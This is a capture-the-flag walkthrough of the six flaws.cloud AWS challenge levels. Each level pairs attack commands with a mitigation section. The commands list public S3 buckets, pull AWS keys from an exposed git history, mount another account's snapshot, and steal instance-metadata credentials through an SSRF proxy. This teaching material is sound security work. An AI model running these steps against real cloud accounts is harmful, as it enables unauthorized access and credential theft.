

![1](</Writeups/Blogs/Flaws/img/1.png>)

# Overview

This post is a walkthrough of every level of the site [http://flaws.cloud/](http://flaws.cloud/)

This site hosts a challenge split into several levels, each one covering a typical vulnerability or a common mistake when using Amazon Web Services (AWS)

## Level 1 - Bad permission setup 1

Alright, the first level is about the server having overly permissive settings for regular users, letting you access the resources without any trouble

One of the first things to do is check whether the server is S3, and to check that we'll use the dig command to get the IP of that URL (targeting the main domain)

```bash
dig +nocmd flaws.cloud any +multiline +noall +answer
```

We'll have to put the IP we get into the browser, and if it takes us to `https://aws.amazon.com/es/s3/` it means we're dealing with an S3 server

With that clear we can use the nslookup command to get more information about that site

```bash
nslookup 52.92.184.115
```

This will give us information such as: `name = s3-website-us-west-2.amazonaws.com.` which clearly states the AWS region

Thanks to the region we can use the aws command to list the information of this service

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

If we don't know the region we can just try them, since there aren't many

If the tool doesn't report anything we can go straight to the url

```text
http://s3.amazonaws.com/[bucket_name]/ = http://s3.amazonaws.com/flaws.cloud/
-
http://[bucket_name].s3.amazonaws.com/ = http://flaws.cloud.s3.amazonaws.com/
```

### Level 1 mitigation

Fixing this is pretty simple: by default S3 buckets are private and secure, and this vuln only gets exploited when “Static Web Hosting” is enabled and, above all, when list permissions are granted to everyone

![1](</Writeups/Blogs/Flaws/img/2.png>)

This vulnerability can lead to these exploits:

- Directory listing of S3 bucket of Legal Robot ([link](https://hackerone.com/reports/163476)) and Shopify ([link](https://hackerone.com/reports/57505)).
- Read and write permissions to S3 bucket for Shopify again ([link](https://hackerone.com/reports/111643)) and Udemy ([link](https://hackerone.com/reports/131468)). This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem.

## Level 2 - Bad permission setup 2

This second level is also very simple, basically the same as before, but this time we'll need to create an AWS account in order to run the scan with that account.

To get more precise information about a domain, we use aws like this

- The profile has to be created beforehand with the command: `aws configure --profile rugalo`

```bash
aws s3 --profile rugalo ls s3://flaws.cloud/
```

### Level 2 mitigation

The way to avoid this is very similar to the previous one: don't grant permissions to anyone, even if they're authenticated

![1](</Writeups/Blogs/Flaws/img/3.png>)

This vulnerability can lead to these exploits:

- Open permissions for authenticated AWS user on Shopify ([link](https://hackerone.com/reports/98819))

## Level 3 - Bad permission setup 3

In this third level we don't find any accessible subdirectory, but there is a hidden one, and since we can't enumerate it through the web we'll have to download it, and for that we'll use **sync** instead of **ls**

```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
```

Having the **.git** exposed is dangerous, since sensitive information can be pulled out of it: you can look through the logs to see whether someone committed something they shouldn't have, and even if they deleted it you'll still be able to see it

```bash
git log
```

With the commit id we can look in detail at what happened

```bash
git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
```

Here we find a file containing credentials, and we can use those credentials to see all the information of that service

- The flaws profile is created with the credentials we obtained

```bash
aws --profile flaws s3 ls
```

### Level 3 mitigation

The way to keep this from happening is obvious: don't leave files with keys lying around, keys are one of the most important things in a cloud service

An example of this problem:

- [Instagram’s Million Dollar Bug](http://www.exfiltrated.com/research-Instagram-RCE.php): In this must read post, a bug bounty researcher uncovered a series of flaws, including finding an S3 bucket that had .tar.gz archives of various revisions of files. One of these archives contained AWS creds that then allowed the researcher to access all S3 buckets of Instagram. For more discussion of how some of the problems discovered could have been avoided, see the post [“Instagram’s Million Dollar Bug”: Case study for defense](https://summitroute.com/blog/2015/12/24/instagram_bounty_case_study_for_defense/)

## Level 4 - Unencrypted snapshots

In this level the server has an EC2 instance running, which is normally used for backups

Since we have the credentials (the ones we got in the previous case) we can list the username and some extra information

```bash
aws --profile flaws sts get-caller-identity
```

This would be the username

![1](</Writeups/Blogs/Flaws/img/4.png>)

With the username and its account number we can list the snapshot

```bash
aws --profile flaws ec2 describe-snapshots --owner-id 975426262029
```

Now that we have the snapshot id we can try to mount it on our own machine to see its contents

We create the volume using the snapshot

```bash
aws --profile rugalo ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89
```

We go to our account, EC2 --> Volumes (switching the region to the one where we created the volume) and take a snapshot of it

![1](</Writeups/Blogs/Flaws/img/5.png>)

Now we're going to create an **Ubuntu** instance

![1](</Writeups/Blogs/Flaws/img/6.png>)

We leave everything else at its default except the key pair, which we create like this (the key will be downloaded, so we put it in the directory we're working in)

![1](</Writeups/Blogs/Flaws/img/7.png>)

We attach the volume (the snapshot of it)

![1](</Writeups/Blogs/Flaws/img/8.png>)

We launch the instance and set the permissions on the key we downloaded

```bash
chmod 400 compromised.pem
```

Now we connect to the instance over ssh

```bash
ssh -i comp.pem ubuntu@35.92.167.183
```

Inside the machine we'll have to list the volume information

```bash
lsblk
```

And we mount whichever volume we want

```bash
sudo mount /dev/xvdf1 /mnt
```

Now that it's mounted on /mnt we just have to go to /mnt/home/ubuntu and open `setupNginx.sh`

### Level 4 mitigation

To prevent what we've just done, you'd have to be very careful with the credentials; on top of that we can encrypt the snapshots so that even with the key nobody can mount them (we can also make the snapshot private)

## Level 5 - Exposed metadata

In this level the AWS service also has an exposed EC2, but this time with public metadata, and we can pull a lot of information out of that metadata, so first we're going to get hold of it

In these cloud services there's always an IP belonging to the metadata service, `169.254.169.254`

In this case the AWS server has a proxy, and we can use it to view the metadata service information

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
```

From there we can list different things, this would be a list of several important endpoints

```text
http://169.254.169.254/latest/meta-data/
-
http://169.254.169.254/latest/user-data
-
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-
http://169.254.169.254/latest/meta-data/ami-id
-
http://169.254.169.254/latest/meta-data/reservation-id
-
http://169.254.169.254/latest/meta-data/hostname
-
http://169.254.169.254/latest/meta-data/public-keys/
-
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
-
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
-
http://169.254.169.254/latest/dynamic/instance-identity/document
-
http://169.254.170.2/v2/credentials/<UUID>
-
http://169.254.169.254/latest/dynamic/instance-identity/document
```

Once we have the credentials we can create a new profile with them (the credentials are the ones from `/meta-data/iam/security-credentials/flaws`)

But we don't just need to create the profile, we also have to edit the `~/.aws/credentials` file

In the profile we just created we'll add a new field, called `aws_session_token`, where we'll put the token we obtained

![1](</Writeups/Blogs/Flaws/img/9.png>)

With this, if we run the scan using this new user it will give us the subdomain to reach the last level

```bash
aws --profile flaws3 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

### Level 5 mitigation

To fix this we have to make sure no application is allowed to connect to the IP `169.254.169.254` or to any IP range, local or private. We can also verify that the IAM roles are restricted as much as possible

Some examples of what could be done with this would be:

- [Nicolas Grégoire](https://twitter.com/Agarri_FR) discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile ([link](https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a)). He also found issues with access to that magic IP with [Phabricator](https://hackerone.com/reports/53088) and [Coinbase](https://hackerone.com/reports/53004).

## Level 6 - IAM misconfiguration (policies)

For this last level we're given some credentials, and we can use them to get more information about the user

```bash
aws --profile flaws3 iam get-user
```

Now we can look at that user's policies

```bash
aws --profile flaws3 iam list-attached-user-policies --user-name Level6
```

Now we have to pull the information for each `policy`

```bash
aws --profile flaws3 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit
-
aws --profile flaws3 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
```

The most important thing there are the `version ids`, and with those ids we can see more information about the permissions of each one

```bash
aws --profile flaws3 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --version-id v1
-
aws --profile flaws3 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
```

Let's look for the policy that has the permissions allowed (generally the MySecurityAudit policy is more permissive than list_apigateways)

![1](</Writeups/Blogs/Flaws/img/10.png>)

Now that we know MySecurityAudit has its permissions set to allow, we can list its lambda function

```bash
aws --region us-west-2 --profile flaws3 lambda list-functions
```

Right, since we have the name of the function we can pull the policy of that lambda function

```bash
aws --region us-west-2 --profile flaws3 lambda get-policy --function-name Level6
```

![1](</Writeups/Blogs/Flaws/img/11.png>)

Then we can invoke this resource

```bash
aws --region us-west-2 --profile flaws3 apigateway get-stages --rest-api-id "s33ppypa75"
```

![1](</Writeups/Blogs/Flaws/img/12.png>)

With this we can try connecting to that stageName, which will give us the final URL to finish this challenge

```bash
curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
```

### Level 6 mitigation

To avoid this, we can simply not grant permissions to anyone, not even read-only, since that can let an attacker understand what's on your server and, as a result, make it much easier for them to compromise it
